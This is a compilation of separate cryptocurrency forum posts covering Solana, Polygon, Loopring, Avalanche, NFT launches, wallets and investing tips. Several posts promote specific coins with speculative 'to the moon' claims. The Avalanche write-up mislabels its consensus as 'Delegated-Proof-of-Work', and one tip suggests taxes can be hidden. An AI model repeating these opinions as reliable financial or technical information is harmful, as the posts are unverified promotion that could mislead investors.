As it is easy to check out, Solana has been consistently doing 60M daily transactions. Of course, this doesn't include votes count. This is equivalent to 700 real TPS right now, although the net capacity is 60k TPS.

This has happened because it's so damn cheap and easy to do transactions. The average transaction fee is 0.000005 SOL or 0.001 USD, although for some smart-contracts is necessary to pay a special fee of 0.002 SOL (0.5USD) the first time you use them, as it creates an account. After that, said smart-contracts just need the 0.000005 SOL fee for any additional tx.  

Just to compare, let me show you the daily transactions from other significant chains:

\- BSC 12M

\- ETH 1.2M

\- ADA 0.1M

\- DOT 0.01

\- AVAX 0.3M

\- ALGO 1.9M

\- ATOM 0.03M

\- MATIC 4M

\- FTM 0.7M

\- BTC 0.2M

\- DOGE 0.03M

\- XRP 1.3M 

Source for Solana: [https://dashboard.chaincrunch.cc/public/dashboard/99b01af5-6653-4788-8a1c-abab9162b508#theme=night](https://dashboard.chaincrunch.cc/public/dashboard/99b01af5-6653-4788-8a1c-abab9162b508#theme=night)

This shouldnt the the topic of this post, but as the level of misinformation is so widespread, I believe it's useful to address the typical FUD about Solana: 

\- Solana is actually more decentralized than most projects. Solana has around 1150 validators, which is the second highest number among all PoS chains. The Nakamoto coefficient, which is another good decentralization metric, is currenltly 19, and improving. This is the minimum agents necessary to halt the network blocking consensus. The number necessary to do a double spending attack is 80 for Solana. For Ethereum PoW, the Nakamoto coefficient is 3-4  to do a double-spend attack. This is an oversimplification, as more context is relevant in this area, but Solana isn't in a specially concerning situation compared to most chains.

\- The hardware necessary to set up a node is expensive (between 4k-7k) but it can be set up in your house if you have good fiber (in Spain, where I live, the necessary one is about 20/month more expensive that the typical fiber cheap contract, the one I have currently). The fact that the hardware is expensive is a barrier for decentralization, true, but Solana has clearly overcome it. This is why Solana has so many validators among. Also, consider that Setting up a ETH PoS node requires an investment of 120k (32 ETH) and nobody cares. In Solana is also possible to set up a RPC node which is cheaper (+900 currently). 

\- I don't know if it's bad faith or just ignorance, but are many people out there repeating the lie that the September halt of Solana shows that Solana is centralized and that the team has a "shut down" the network. I recommend reading [https://solana.com/news/9-14-network-outage-initial-overview](https://solana.com/news/9-14-network-outage-initial-overview) to understand what happened. But it showed that Solana is decentralized, as it was necessary a supermajority of validators (80%) to agree a consensus on a patch, and coordinate an upgrade-and-restart of the network. Just the opposite of a centralized network. BTW, not the first blockchain that stopped several hours, last August it happened during 4 hours to Ethereum.

Hi guys. i just wanted to ask, in your opinion, what are
the coins worth looking out for which may blow up in
the near future just like how Solana did. My guessing is
Algorand, XLM, and Polkadot
Although their market cap tells us a different story so i
wanted your guys opinion on how the price my reach
sky high and which coin may be the best choice for
that. Also i'm a new to crypto so all this is very new to
me.
Hopefully someone can help me regarding this, i am really interested in investing into some crypto as it looks like it could be really major in the future

Yes the first Bitcoin post was made by a kid in the r/Libertarian, but that doesn't mean that Satoshi intented BTC to be a libertarian tool. 

Yes on the first block there was a newspapers header about banks, yet are you guys sure that Satoshi was complaining about taxes, or perhaps how taxes are distributed? Bitcoin was his answer, but more than a decade after other ways to cut on corruption and bad taxes allocation may come.

This might be pretty unpopular opinion in this sub and I'm prepared for the downvotes, but CBDC could be extremely beneficial for society.

Here me out, with CBDC s when a bill is passed money could be programmed for only to go to where it is intended to go, not to some politician hands. Also that money could be audited as if there ever was an investigation all transactions could be viwable by a judge. 

That said, cryptocurrencies will always have their space, Bitcoin could be the stardad on what these CBDC s were made, like gold for dollars at the beggining, or Ethereum with dapps.

Particularly when it comes to altcoins. I feel like too many people get caught up in idea of their project moving in the same way BTC and to a lesser degree ETH have moved in the past, and fail to recognise the incredible profit in front of them because they're comparing its movement to these projects at the very top.

I've done the same in the past: I see a doubling of my money and convince myself naively that it's best to hold on and wait for that larger move - more often than not it never comes. The market is evidently growing at a fantastic rate, and it's not impossible that some alts might move in a similar way in the future - but just so, a great deal will have already peaked; so, generally it's best to take that profit, or at least recoup what you initially put in. Also, always check the marketcap; if it's in the tens of billions, that astronomical move becomes less and less likely.

Ultimately, it's all about the extent to which you can shoulder risk; and of course being realistic about potential price movement. Don't lose out because you haven't properly thought things through.

In case you dont know about it or dont use Binance, theres a feature in the Spot wallet called "Convert Small Balance to BNB", and if you click it you will see a list of any currency deemed small by Binance (not sure what the criteria is). From there you can select or unselect whichever ones you want, and convert it to BNB for a pretty small fee. 

A lot of us probably has a lot of different coins, which together with staking, air drops etc. means you end up with a bunch of 'dust' - tiny values from coins you havent even heard about. Theres a good chance you also have "hide small balances" activated, so you dont even know whats in between the proverbial couch cushions. A lot/most will probably be too low value to be allowed to sell/transfer, or even cost more in fees than you gain.

Of course you can use them as a lottery ticket and hope that your 20 cents of ElongDong turns into a million, but since Im bullish on BNB, I love to just use this to stack some more. I looked in my history and saw that Ive gotten 0,14 BNB altogether from this, a decent USD 82 at current value or USD 96 at ATH, which is pretty sick tbh. 

Just got excited and wanted to stoke, and maybe/hopefully this was news to some.

Ive been in the NFT game for 2 months now and its gone reasonably well, but theres a lot Ive learned on my journey. Ive previously written a couple of posts on here about my NFT creating journey and the response was good. I want to help as much as possible for anyone coming into this field, so Ive listed some mistakes Ive made along the way so that you dont have to make them too.

All of these assume you have a plan in place or have already created an NFT collection.

&amp;#x200B;

\#Choose your blockchain and marketplace carefully

Ive previously discussed options when choosing a marketplace or blockchain. Having had more experience now I can give some additional feedback on this.

I chose to go with ETH on the Ethereum network due to the fact that I want to go BIG or go home! The whales of the NFT marketplaces seem to be on this chain and all of the big projects that hit the moon are here too, this is why I chose this option However, having experienced some issues I wanted to point you guys in the direction of the other options that are extremely viable!

Firstly, if you are going to market your NFTs on OpenSea, which isnt a bad idea, then youll need to decide between ETH on Ethereum or ETH on Polygon. 

The reason Id recommend ETH on Polygon is because when starting out for the first time you will want to price your NFTs are a reasonable buy in cost. As a new project you need to build up a community before you get noticed more. The first investors you should aim your NFTs at are fellow artists! This may sound nuts, as other artists are trying to sell, not buy, but youre actually not right if you think like this. Other artists are also looking to invest in other projects too and they are the easiest investors to pick up early on.

However, other artists generally want to spend less, so GAS FEES are a major road block! 

On the Polygon network there are ZERO gas fees. This is highly attractive to any investor looking to buy in early to a project for cheap! A bit like when shopping online, you are probably more attracted to an item that has no shipping costs, even though the shipping costs are added into the cost of the item itself, the fact that it says \*\*Free Shipping\*\* is highly attractive to the buyer! Its the same with Gas Fees.

If I was to start my project over, Id seriously consider releasing on Polygon. Ive seen a few projects do incredibly well on there.

I only have experience with OpenSea, so I cant comment on others yet, but I know there are some other popular choices that use different cryptocurrencies. 

Most notable and mentioned amongst the communities Im a part of are:

Rarible, BakerySwap, Nifty Gateway, Foundation, CNFT, Solanart. 

Id recommend checking out all of them before making a decision.

&amp;#x200B;

\#Plan a release schedule

So, the next thing you should do once you have planned or built your collection and decided on a marketplace and blockchain is to figure out how and when you are going to drop your NFTs on the market.

There are a few different ways you can release your nfts. This is one mistake I made, I didnt research other projects enough first and see how they went about releasing.

1) Release slowly

I know a few projects that simply release one NFT a day or less. This seems to have worked superbly well if youre not planning to make a 10k collection. You start slowly and at a cheap price, then every time one is purchased you raise the floor price by a small amount.

One project Ive been watching and every bought into early started at 0.001 ETH on Polygon. Over the course of 2 months they used this release tactic and now they sit at a 1 ETH floor, and its still rising!

2) Release everything at once

This method is generally used if youre releasing a massive collection. As you need to mint the collection on the blockchain at once using a smart contract (otherwise it would take weeks to upload individually), the collection is generally dropped all at once after being hyped up first.

3) Release a set amount per week

This is the tactic I took. Its not a bad tactic overall, but I made the mistake of doing this straight away with no hype whatsoever about my project first and zero social media following!

Considering that Ive done ok to build everything up on the go, but I wouldnt recommend this stressful method of release unless you have the next step in place first!

\#Build up your socials and project hype before release

So the most important thing about creating and selling NFTs is the community you build up around your project! Ive built this up over the course of release as mentioned above, but a better way to do this is to have your project ready to drop in which ever method of release you choose, but build up hype on social media \*\*first!\*\*

You can release the images of the NFTs youre going to sell, make some marketing materials and get the word out there on Twitter, Instagram, Facebook, Telegram, Reddit (of course) and anywhere you can think of. Make a \*\*Discord\*\* server for your project and set everything up FIRST, before release! Youll thank yourself for it later and your project should get off to a flying start this way.

Have a roadmap in place and a release date! Important! Investors want to see your project has a future. At the end of the day theyre at least 75% buying into your project so they will make money later on, whether thats a fast buck or a long HODL to the moon, if you have no roadmap, they wont know if the project is going to advance.

&amp;#x200B;

\#Plan out your rarity traits before you make anything

I had an idea of these values before making my bottle cap nfts, but I didnt generate a rarity trait list until Id released the first batch. Luckily, I wasnt too late, but I learnt the hard way. 

Know how many NFTs youre releasing overall and generate a list of traits that will be added to them.

You may decide on four properties to add to each NFT, for instance, so youll want to have a number of traits per property and some rarer than others. I used an excel spreadsheet to list these out and every time I release an NFT I tick it off the list, so I know how many have been used.

Be organised NOW, not later, otherwise youll end up in a world of panic!

&amp;#x200B;

\#Dont get scammed

Once youre out there marketing your project you are going to be approached by COUNTLESS promotional accounts. 

DONT DO IT!

Unless youve had a direct recommendation from another artist you trust whos tried one, do not fall for these scams.

On Instagram there are so many promo accounts with lots of followers. 99% of these accounts are bullshit. They have bot account following and liking their posts. How can you tell? Look at their posts, how many comments are on them? Usually there are very few comments and most of the comments say something like, Love it! DM us now! (basically, other promo accounts spamming the threads), or therell be loads of comments, but multiple from one account with only emojis on them. They usually only have a small number of posts too, say 50-100 posts for NFTs. Thats because the account probably used to promote a different topic and they deleted all of the posts from the unrelated topic for their new scam!

On Twitter, there are a lot of promo accounts that will Shill your project. These are also generally pretty poor but charge a lot more than the Instagram ones. Ive had a few community friends try these out and get extremely poor results. They also usually charge in ETH, from 0.05-0.1, so this can be expensive for not a lot of pay off.

On Discord youll be messaged continuously for promos. This is the worst! On Twitter and Instagram the scammers have an actual account and will genuinely give you the post they promise to, the scam part is the engagement with your post as they are followed by 90% bot accounts.

On discord however (and this is one I fell for) they promise to shill your project and gain you joiners for your server. Now this is something you can do yourself and youll also get results, but hiring a team to do this for you will allow you to focus time on the project itself, so it can be money well spent, however ONLY go through recommendations! I went for one shiller who made a good offer to shill my work and gain me some following, only for me to pay him and he disappeared into thin air! That was an expensive $250 lesson for me. DO NOT make the same mistake guys!

&amp;#x200B;

Well, these are all the points I wanted to share with you today. I know I wish Id read some of this stuff before I started out my project, so hopefully itll really be beneficial to some of you on here.

Dont start on ultra-hard mode like me :D 

If you want to check out my project and see if I really know what Im talking about, Id love for you to visit! [https://digi-caps.com](https://digi-caps.com/) Its a Fallout themed project with bottle caps, so if you were into that game youll love it.

You can find a link to my \*\*discord\*\* on there, so please join up and come and have a chat with me if you have any questions! I really love sharing the knowledge Ive learnt along the way. Like I say, its all about community, and Ive loved being a part of the r/cryptocurrency community as well, so if I can help any of you out, Im happy to!

I was wondering that what device do people use for trading their Cryptos. Do you use mobile or PC/Laptop? If mobile, then is it iOS or Android? If PC, is it Mac or Windows?

Also, is it a good option to use a dedicated iOS iPhone to store Cryptos in a Hot wallet? Assuming that the phone will be only connected to the internet only when buying or selling coins and rest of the time, it is stored in a locker with MFA enabled on e-mail, exchange, hot wallet and password lock enabled on iPhone with no extra other extra apps installed. I know HW are more safe than Hot wallets but if one wants to trade very frequently, the time consumed in transferring funds from HW to exchange would be long to book profits.   
Using exchange assumed - Binance or Coinbase

First time posting, long time lurker

So I opened the Trust wallet app this morning on my phone (iOS) and all of my balances are at zero. My initial thought was that I got hacked somehow and everything is gone. So I reset my phone and tried again. Still everything was at zero. I decided to check each wallet and see if there was a transaction, but when I did some of the coin balances started popping back up. I dont think I have been hacked now, but Trust seems to be very glitchy at the moment. Has anyone else had issues like this?

*\*Today is Day 4 of me doing full-time in cryptocurrency as a reddit publisher. Hope I can get support from the community. 6 months of reserve left for my family and I. A moon tip is greatly appreciated\**

I'm a rather new publisher learning about crypto and I hope you can join in this adventure with me and understand my efforts. I appreciate if there is minimal hate and more on guidance :)

# Who/What is Polygon?

Based on their website, Polygon is a protocol and framework for creating and linking Ethereum-compatible blockchain networks. Aggregating scalable Ethereum solutions to support a multi-chain Ethereum environment.

Polygon addresses Blockchain-related issues such as expensive gas fees and poor performance without losing security. This multi-chain method is similar to others such as Polkadot, Cosmos, and Avalanche, but with at least three main advantages:

1. It can reap the full benefits of Ethereum's network effects.
2. It is more secure
3. It is more accessible and powerful.

However base on their website, there are potential challenges that may arise as well:

1. Low throughput
2. Poor gas, delayed PoW finality
3. No sovereignty

Even though there were challenges faced, their solution are unique:

1. Adaptor modules for enabling interoperability for existing blockchain networks
2. Growing set of modules for developing customer networks
3. 1 click deployment of preset blockchain networks.

Let's look at the fundamentals of it

It is not as easy to create fundamental basis in cryptocurrency but there are a few metrics we can use. Polygon's token, MATIC, is the basic resource that powers the Polygon ecosystem. In addition to being an asset, it is primarily utilized for staking tokens (proof-of-stake algorithm) to protect the Polygon network.

The MATIC token has a maximum quantity of 10 billion, more than 67% of which is now in circulation. It is now ranked among the top 25 cryptocurrencies in the world.

# Collaborations

Polygon established a collaboration with Infosys Ltd's consulting division. M-Setu is the name of this partnership. It intends to empower Infosys to give its clients with disruptive technology. M-Setu will serve as an open-source bridge that will allow businesses to collaborate utilizing the Ethereum blockchain.

Another significant Polygon collaboration is the Trace Network. Trace is now employing it for NFT and DeFi, with the goal of becoming a go-to for shops to introduce NFTs to the public. For example, if a luxury business wanted to do NFTs on their items, the combination between trace and polygon would provide them with liquidity aggregation, comprehensive transparency, and supply chain traceability.

Polygon made a tremendous announcement on May 29th, in addition to several other significant achievements. It announced the completion of a project to integrate the Polygon elements into Google Cloud's BigQuery. This connection allows BigQuery users to connect to Polygon, boosting its usability and positioning. Polygon has been added to Google Cloud's BigQuery's 1TB offering. This means that BigQuery users can utilize Polygon to execute queries and access various blockchain-related data sets on its network.

# Billionaire Mark Cuban backs Polygon

On May 25, Mark Cuban threw his support behind this Indian Blockchain business. He disclosed that he has made an investment in Polygon, which can be seen in his company's portfolio on their website. Cuban is well-known for his support for cryptocurrency. Despite Elon Musk's temporary suspension of taking Bitcoin payments for Tesla, Cuban declared that the Mavericks (his basketball outfit brand) would continue to accept cryptos.

He noted that having a high Transaction Per Second (TPS) as Polygon offers is critical to lowering consumers' use costs. Furthermore, Polygon already has many blockchain initiatives, which adds to his motives for investing.

Polygon's flawless growth has been aided by Cuban's funding. Polygon should expect higher adoption in the future as a cryptocurrency backed by the billionaire investor who backed Bitcoin, Ethereum, and other other cryptocurrencies.

# Major Announcement

Another significant announcement that is going to be made is the launch of Indian Premier League fan tokens backed by Polygon. The IPL is by far the most popular sporting league, with millions of supporters not only in India but all around the world. The League's active embrace of these currencies would draw in a large number of fans to the network, as well as aid to bring crypto into the mainstream. This would be big for the Indian crypto business, but it remains to be seen how this would be structured, as crypto is not yet legal in India.

TLDR;

MATIC still has a done of potential to moon!

Sorry to break this news to you, but yes, you probably would have bought [pets.com](https://pets.com) instead of the googles or amazons of the dotcom era. We are in a different market, but people tend to be the same more or less. 

While hype is important, it can only last for so long. Everyone here probably knows a talker, someone who can really sell themselves, but when it comes time for them to perform they just don't measure up. Most crypto tokens are this way. Most crypto tokens have a rabid fan base who loves to talk about how great their token is. The token is going to be revolutionary. The token has so much potential. The token is so great that they haven't even taken 5 minutes to play its game, service, product or convince someone to even use it. 

Imagine this for a moment. There are thousands of tokens out there all vying for adoption yet nobody is actually adopting them. On the protocol level theres hundreds of tokens fighting to be the pipes and wires like the hundreds of telecom companies that came before them who now only have a few remaining and surviving. On the user level theres hundreds of tokens that cant even get 100 app store reviews or 100+ daily users.

I challenge you to ask yourself what crypto applications do you use everyday? What crypto applications do you see your parents, grandparents, coworkers, etc using? If its a pipe or wire, then what makes it stand out from the others like the hundreds of telecom giants that failed before it?

Theres only two crypto companies that I know of with over 50m users and the third will be hitting that in about a month or two and the fourth will hit that in probably 14 months from now. If you cant name these 4 companies or get close then theres a pretty good chance you would have never bet on the amazons or googles.

If you are doing what everyone else is doing then you are going to be like everyone else. The people in this market who are going to be millionaires and billionaires are going to be the ones who tap the value in undervalued coins and tokens, the creators, or the ones who just see what nobody else sees. There is still insane opportunity out there hiding in plain sight. The biggest businesses in the world create the products/services you use every single day. You don't have to look far to find those "hidden gems" trust me on this, they are not hiding.

I entered into the crypto community using mainly CB and their "free" quiz coins.  I then began to trade these coins/tokens  and then I started staking and DCA (ing?) on different exchanges.   Since this time there have been a number of bull and bear markets and I am unclear on exactly how much I have entered and subsequently gained (\*Lavar Ball voice\* "never lost, never lost").

On CB click on your profile, and select reports an you can generate an all time report on PDF.

This provides a breakdown of all the transactions you have made on the exchange.  This is really useful to track profits (never losses) and for those working class heroes who pay tax.  

I have not found this feature on any wallets or exchanges and I hope they all introduce it.

Big love, Bucky

So this last week LRC seems to be the most talked crypto topic around here. With all kinds of evidence hinting at a partnership between GameStop and Loopring.

I.E.: [This post](https://www.reddit.com/r/CryptoCurrency/comments/qmnolp/more_smoke_in_the_lrc_gme_saga_as_new_code_leaks/)

As much as I love this project, I would like to mention -and remind you all- with all this evidence and rumors the news is probably already priced in. Also keep in mind LRC already went up 100+% this past week. It won't magically pump another 100% when the news actually drops. It is more likely to drop due to the "buy the rumor, sell the news" effect.

Don't jump the hype train and chase pumps. I made those mistakes in the past. It hurts. I'll be waiting for the "buy the rumor, sell the news" effect to take place before filling up my bag again. Do with this information as you please, it isn't financial advice, just some helpful information to not FOMO in just yet.

Ut might be already happening but if  crypto becomes main stream  a company like microsoft could choose  to make its own coin or just adopte a low market cap one buy it and then reveal  the announcement of adopting it as a payment and even paying employees who accept it.

Maybe they would give the employees 5% more if they take it in crypto.

This would net the company millions like it did  for tesla in btc but imagine what a small cap coin would do for a company the coin would go parabolic. 

Tesla made  more money from btc then from selling cars. 

But maybe instead of  dumping it they will keep it around and it will be a reveloutionary  time i  will buy all these coins early.

1. Do you think this will happen?
2.if you where to predict  a time just for fun what would you say?
3. Which coin would you pick for which company and yes you can joke  about it its more fun.

Weve all see the headlines about SHIB, DOGE and other coins, "*$1000 a year ago would be millions today",* but to get those gains you'd need to invest really early.

Through this sub we now have also seen what would have happened if you had invested your money into coins like Squid, Shibafever or BabyKrypto.

But what would have happened if you tried to keep your risk low, by investing into stabilized coins? If you would have invested $1000 a year ago into the following coins and staked them with an APY of 5% you would have:

* Tether - would be worth $1050 today
* USD Coin - would be worth $1050 today
* Dai - would be worth $1050 today

Considering an inflation of 3% you'd still be up 2%. It isn't much but still way better than just letting your money rot at the bank.

Not an financial advice. Maybe. You can do whatever you want.

Hey I have reached a point within my trust wallet where If I lost these funds for no good reason it would hurt. Now if I was careless wth my seed phrase , fell for a scam or followed a dodgy link Id cop that sweet. But if I lost my investments for no reason Id be absolutely gutted. So back to my point not so much have you had problems with trust wallet but rather have you had one for a long time and never had problems with it because Im reading about some horror stories which have made me nervous and its hard to split the truth and the bullshit.

 *"Today is Day 4 of me doing full-time in cryptocurrency as a reddit publisher. Hope I can get support from the community. 5 months 3 days of reserve left for my family and I"*

*"Full Disclosure, I only have 6% of Loopring in my portfolio."*

# What is Loopring?

Loopring is an Ethereum-based software platform that intends to reward a global network of users to manage a platform that facilitates the creation of new forms of crypto asset exchanges. Loopring, one of a growing number of decentralized finance (DeFi) protocols, provides this platform by combining different cryptocurrencies, including its own LRC token.

Most significantly, Loopring promises that their platform will enable exchanges built on it to avoid the poor speeds and high prices associated with decentralized exchanges on Ethereum by utilizing a newer type of cryptography known as zero-knowledge rollups, or zkRollups. Loopring claims that with zkRollups, its exchanges can provide traders with speedier settlements. zkRollups allow Loopring exchanges to finish key computations elsewhere rather than directly settling trades on the Ethereum blockchain (as other decentralized exchanges do).

The concept is that by lowering the amount of transactions that a Loopring exchange must submit to the Ethereum network, traders will be able to trade faster and at a lower cost. In contrast, other decentralized exchanges require transactions to be validated by the Ethereum network, which takes minutes rather than seconds or milliseconds.

# The team in Loopring

Loopring's creator and CEO is Daniel Wang. In 2014, he controlled Coin Port, a centralized exchange. During that time, he attempted to remedy the problems caused by centralized exchanges, but concluded that the problems could not be rectified since they were inherent in the centralized exchange concept. This resulted in the conception and subsequent creation of Loopring. He was previously the co-founder and vice-president of Yunrang Technology, as well as a Google Tech Lead.

Loopring's CMO is Jay Zhou, who previously worked in Paypal's Risk Operation Unit and was also hired by Ernst &amp; Young. He was also one of the primary founders of SJ Consulting.

Steve Gou, Loopring's CTO, is the third member of the core team. He collaborates closely with Brecht Devos, the project's Chief Architect.

# Competition

0x appears to be pursuing the same goal as Loopring, yet there is a significant distinction between the two. Whereas 0x allows anybody to build a node as a decentralized exchange, and all orders are handled off-chain but settled on-chain, 0x only receives liquidity from exchanges that have been built on the 0x platform. This is in stark contrast to Loopring, where liquidity is provided by any exchange that links to the Loopring network. Other competitors include Kyber Network, Blocknet, and Bancor. There are liquidity pools and order matching in Kyber Network and Bancor that ensure deals are met across smart contracts, while Blocknet functions in a similar method but just with order matching. There is no rival who can provide the ring orders generated by the Loopring protocol's ring matching.

# Conclusion

Loopring distinguishes itself from other decentralized exchanges through the use of ring-matching and ring orders, and as they continue to develop ring-matching, we may see an even bigger boost in market liquidity when three or more orders are paired. Furthermore, Loopring's order sharing model outperforms standard order matching by allowing for more flexible purchasing and selling.

Loopring's blockchain agnostic adaptability is perhaps one of its most significant advantages. As long as a blockchain incorporates smart contracts, it can connect to the Loopring network, allowing orders to be fulfilled through several channels. Unfortunately, Loopring has halted this portion of the project. Decentralized exchanges should see more adoption as Loopring adds liquidity and levels the playing field, and Loopring will benefit from additional exchanges joining the network.

Investing in cryptocurrency has undoubtedly been extremely volatile, as many of you are aware. During May, everyone thought we were on the verge of a Crypto winter, and the sentiment was bearish across the board.

However, I believe that many of us in the community remained strong and were able to maintain a dollar cost average during this time period in 2021. However, there were many more significant drops for those who held on after 2013.

What have you really learned from holding your crypto over the months/years, in one sentence, to those new and OG members in this community?

 I'll go first, in one sentence, "Buy; Stake; Get rich". 

What are your thoughts on this? I'm curious to know what this community thinks.

Not sure if this is possible, or easy to convey briefly, but I want to have different amounts of a coin in one app eg Coinbase so that I can trade some and keep some for longer term / to trade at different prices
Eg. Invest 2k to trade and 3k to keep, or have one 2k investment to sell at one amount and one at another amount. 
I see in Coinbase that u can sell 25/50/100%, but what Im really wanting is to keep the initial investment amounts as separate entities and work them in different ways to vary the amount of risk/return
Not sure if this is clear enough  
Is there a way to have multiple accounts, or is that too complicated?
Also, what are the best trading apps that you use  I have some money in Revolut too but that seems to have high trading fees  but I like that I have a separate pot of currency to my usual day-traded Coinbase pro account
Thanks :)

1. Never invest money you will need in a short period of time. This is not a game, so quit playing.
2. Never invest money you will need during an emergency. You might be down at that moment. 
 3. When investing forget about the money you invest. Solid projects go up and down on the daily but on the yearly its mostly up. 
4. Get use to 20-50% drops and months if not years of no sign of life. The faster you get use to this the less stressed you will be.
5. ALWAYS GO AGAINST THE MARKET by that I mean panic BUY when everyone is panic selling, take profit when everyone is FOMOing in. 
6. Time in the market beats timing the market! Persistence always wins.
7. Everybody is a genius in a bull run. 
8. NEVER SHARE YOUR PRIVATE KEY OR INPUT YOUR 12/24 WORD PHRASE IF YOU ARE ASKED BY ANYONE ANYWHERE.
 9. If you get an email that causes you fear and a heart attack its most likely a scam. ALWAYS DOBLE CHECK THE EMAIL, if its a scam it will be some random email. 
10. NEVER CLICK RANDOM LINKS IN EMAILS! You aint getting shit free in life.
11. If its too good to be true, it most likely is. 12. Meme coins are a gamble not an investment, always take profit or at least your initial investment. Have something to show for it, rich on paper is not something to be proud of. Life changing money mean nothing if you dont change your life with them.
13. Never chase pumps. You missed it. Its gone. Move on. Dont chase it. You playing with fire. 
14.Never panic sell, there will almost always be a bounce if you want to sell do it then. 
15. (For USA residents) If you sell for profit or switch between cryptos be ready to pay taxes. Yes you can hide it, but remember sooner or later Uncle Sam will get his piece of the pie if not the whole cake. 
16. Always have a nice stack on the side for major dip days. Millionaires are made during bear markets. 
17. The trend is your friend until the end. 
18. Do not leave large funds on an exchange, not your key not your crypto. Go ask those who used mt gox, cryptopia and many other good exchanges.
19. Be prepared to be down or even for at least 2 years, yes even if you are up 1000%, bear markets can be brutal. Ask those who were up in late 2017. 
20. Quality over quantity! Its better to invest big on 5 projects than small on 15 projects. 
21. Dont hate on Bitcoin. It made all this possible. It will remain king no matter what place its in. Its like hating your grandpa for being slower than you. He is the reason you alive in the first place. 

Been in this game since 2016, I know it aint much compared to some other cats on this forum but I believe they would also agree.feel free to add shit I missed.

Avalanche (AVAX) is a blockchain ecosystem that was designed to function as a secure, globally distributed, decentralized network. The project has been referred to as a platform of platforms by its developers. Uniquely, the protocol leverages three distinct blockchains to create an interoperable and trustless framework for developers to build upon. Additionally, Avalanche offers payment solutions in the form of a cryptocurrency (AVAX).

What Problems Does Avalanche (AVAX) Solve?

Avalanche wasbuiltto solve multiple issues found in most blockchain networks today. The platform combats centralization by providing a viable alternative to networks like Ethereum. It also builds upon some of the shortcomings of that network with more programmability, features, and functionalities.

Congestion

Avalanche is designed to be scalable. The network has demonstrated sub-second transaction times, putting it on par with the top payment processors in the world, such as VISA and PayPal. Specifically, the blockchain has can process 6,500 transactions per second. These transactions feature sub-second finality as well.

Low Fees

In terms of operating costs, the Gas fees on Avalanche are much more affordable than Ethereum. There are fees for creating and minting assets. You also pay fees on transactions, staking, and the creation of blockchains. These fees are then burned.
Avalanche (AVAX) Features

Benefits of Avalanche (AVAX)

Avalanche introduces some impressive benefits for corporate and individual users. The network allows businesses to effortlessly create new blockchains. Developers can construct a selection of blockchain services, tokens, and coins. Avalanche tokens can represent financial instruments such as equities, bonds, debt, fractionalized real estate, and more. They can also be coded as NFTs (non-fungible tokens).

Programmable

One of the core desires of the developers behind Avalanche was to allow businesses to create application-specific blockchains andDapps. The network was built to execute multiple custom virtual machines in addition to instances of the Avalanche Virtual Machine (AVM). Avalanche (AVAX) is flexible in that you can program using multiple languages, including EVM and WASM. The network was coded using the popular Go language.
Network participants can easily create and trade digital smart assets. These newly formed tokens can be tailor-made to suit the developers technical and regulatory requirements. In this way, Avalanche is ideal for the creation of defi platforms

Avalanche (AVAX) Compliant Dapps

Avalanches network allowsDappdevelopers to code in complex custom rule sets. This move was wise as it allows these developers to create regulatory compliant assets. The coding can be set to describe how the asset is handled and traded. This approach makes it easy to ensure compliance can be met.

Deflationary

Avalanche is a deflationary blockchain. The network collects fees from various actions and then sends these coins to be burned. The burning of these tokens reduces the total amount of AVAX in circulation. In turn, the demand for these tokens can be controlled and prices stabilized in the future.

How Does Avalanche (AVAX) Work

Avalanche introduces a triple-blockchain strategy to simplify conversions and development processes. The network also shares several features found in early blockchains like Bitcoin. Specifically, the UTXO model is the same. Also, the network reduces congestion further via a Segwit like protocol.

Subnet

One of the core components of Avalanche is the ability to build blockchains. These new blockchains are known as Subnets within the Avalanche ecosystem. Developers have full programmability over these blockchains. They can set up the networks with unique tokens, rules, and fee structures. Notably, anyone can create their own subnet by paying a subscription fee in AVAX.

X-chain

The first blockchain is known as the X-chain. X-chain is decentralized and designed to be easy to program. This network enables anyone to create and mint other smart digital assets. These new assets can be stablecoins, utility tokens, NFTs, wrapped tokens, equity, and more.

C-Chain

The C-Chain was created to simplify the conversion for Ethereum Dapp developers. As a conversion chain, C-Chain iscompatible with all vital Ethereum tooling. Users can migrate their Dapps to this blockchain seamlessly. The network supports popular Ethereum features such as MetaMask, Web3.js, Remix, Truffle Suite, and the Embark Platform.

P-Chain

The P-Chain is responsible for the utilities of the network. This chain is whats used to coordinate Validators. The blockchain also plays a role in monitoring and the creation of new subnets. P-chain allows for the staking of tokens on the network.

AVAX Staking

Users can earn rewards in AVAX by staking on the network. Unlike its competitors, the hardware requirements are minimal for staking on Avalanche. You will need at least a dual-core processor, 4 GB Memory, and 40 GB SSD to run a Validator. On average, stakers receive rewards ranging between 9.69% and 11.54%.
You must hold at least 2000 AVAX to qualify as a Validator on the network. Validators can validate multiple subnets but its also mandatory to validate the primary network. Additionally, regular users can delegate their tokens to a Validator and receive rewards for their participation.

Consensus

Avalanche operates as a DPoS (Delegated-Proof-of-Work) ecosystem. Validators secure the network and approve transactions. DPoS networks are much faster than PoS or PoW options due to their reduced consensus requirements. Avalanches blockchain is set up to accommodate millions of Validators all participating in consensus. This strategy provides layers of decentralization.

AVAX

AVAX is the main cryptocurrency of the Avalanche ecosystem. Users receive rewards and pay fees using this toke. In total, there are only 720 million AVAX tokens scheduled for issuance. Of these, 360 Million tokens were minted at launch. According to the platforms Tokenomics, the other 360 million are earmarked as staking rewards.


History of Avalanche (AVAX)

Avalanche had been in the works for over a year before it launched its mainnet in September 2020. The project was created by Ava Labs. Notably, this firm is led by Cornell researcher, Emin Gn Sirer.
Avalanche started running out of the gate. The platforms public token sale raised $42 million in 4.5 hours. Impressively, there were some notable participants include the venture firm, Andreessen Horowitz and participants from anEthereum Genesis address.

How to Buy Avalanche (AVAX)

You can find Avalanche (AVAX) on a number of top exchanges. BothBinanceandHuobisupport this.

How to Store Avalanche (AVAX)

If you seek to make a major investment in AVAX or if you are planning on HODLing this crypto for long periods of time, ahardware walletis the best option. Hardware wallets keep your crypto stored offline in cold storage. This strategy makes it impossible for online threats to access your holdings. TheLedger Nano Sor the more advancedLedger Nano Xboth support Avalanche (AVAX).

Avalanche (AVAX)  Enterprise Blockchain 2.0

Avalanche provides a unique feature set that makes it ideal for enterprise-level blockchain creation. The inclusive nature of the blockchain, coupled with its technical aspects, makes it stand out in the sector. You can expect to see more interest in this project as Ethereum developers continue to seek out more cost-effective alternatives.

Hey guys and girls.

Another college student here trying to make his future better!

I have been lurking in this sub for quite some time reading, soaking information.

But still don't feel like knowing enough to jump into crypto.

So any kind of help would be great, any tips, knowledge acquired over time, any papers I can read I really try to learn and understand the things I want to try, not just blindly jump in.

And also for the people that are investing in Macedonia or the ones that know what would be the best App to start out, and also for Germany which one would you recommend?

&amp;#x200B;

Thanks and have a green day \^\_\^ xx

